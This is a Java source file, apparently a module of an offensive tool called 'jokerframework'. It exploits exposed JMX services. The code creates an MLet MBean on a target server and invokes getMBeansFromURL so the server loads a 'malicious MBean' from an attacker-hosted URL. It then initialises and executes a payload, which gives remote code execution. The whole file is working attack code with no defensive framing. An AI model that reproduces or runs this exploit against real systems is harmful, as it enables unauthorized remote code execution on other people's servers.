package com.lucifaer.jokerframework.modules.exploits;

import com.lucifaer.jokerframework.data.JmxDataModel;
import com.lucifaer.jokerframework.modules.Exploit;
import com.lucifaer.jokerframework.modules.Payload;
import com.lucifaer.jokerframework.server.http.JokerHttpServer;
import com.lucifaer.jokerframework.server.jmx.JmxClient;

import javax.management.InstanceAlreadyExistsException;
import javax.management.InstanceNotFoundException;
import javax.management.ObjectInstance;
import javax.management.ObjectName;

import java.util.Set;

import static com.lucifaer.jokerframework.utils.OutPut.echo;

public class JmxExploit implements Exploit {
    private Payload payload;
    private JmxClient jmxClient = new JmxClient();

    @Override
    public void setPayload(Payload payload) {
        this.payload = payload;
    }

    @Override
    public void exploit() {
        jmxClient.setTargetUrl(JmxDataModel.targetUrl);
        jmxClient.init();
        try {
            JokerHttpServer.create();
            getMLetBean();
            payload.init(jmxClient);
            payload.exec();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getMLetBean() throws Exception {
        try {
            JmxDataModel.mletBean = jmxClient.getMbsc().getObjectInstance(new ObjectName("Payload:name=payload,id=1"));
        }
        catch (InstanceNotFoundException e) {
            String mletClass = "javax.management.loading.MLet";
            try {
                JmxDataModel.mletBean = jmxClient.getMbsc().createMBean(mletClass, null);
                install();
                getMLetBean();
            }
            catch (InstanceAlreadyExistsException error) {
                JmxDataModel.mletBean = jmxClient.getMbsc().getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                install();
                getMLetBean();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void install() throws Exception {
        echo("[INFO] Loading malicious MBean from " + JmxDataModel.installUrl);
        echo("[INFO] Invoking: " + JmxDataModel.mletBean.getClass().getName() + ".getMBeansFromURL");
        String[] mletParams = {JmxDataModel.installUrl};
        String[] mletSigneture = {"java.lang.String"};
        Set mbeanSet = (Set) jmxClient.getMbsc().invoke(JmxDataModel.mletBean.getObjectName(), "getMBeansFromURL", mletParams, mletSigneture);
        for (Object element : mbeanSet) {
            if (element instanceof ObjectInstance) {
                echo("[INFO] Object name = " + ((ObjectInstance) element).getObjectName());
            } else {
                echo("[ERROR] Exception = " + ((Throwable) element).getMessage());
                echo("[FAIL] Install Fail");
            }
        }
        echo("[SUCCESS] Install Successful");
    }
}
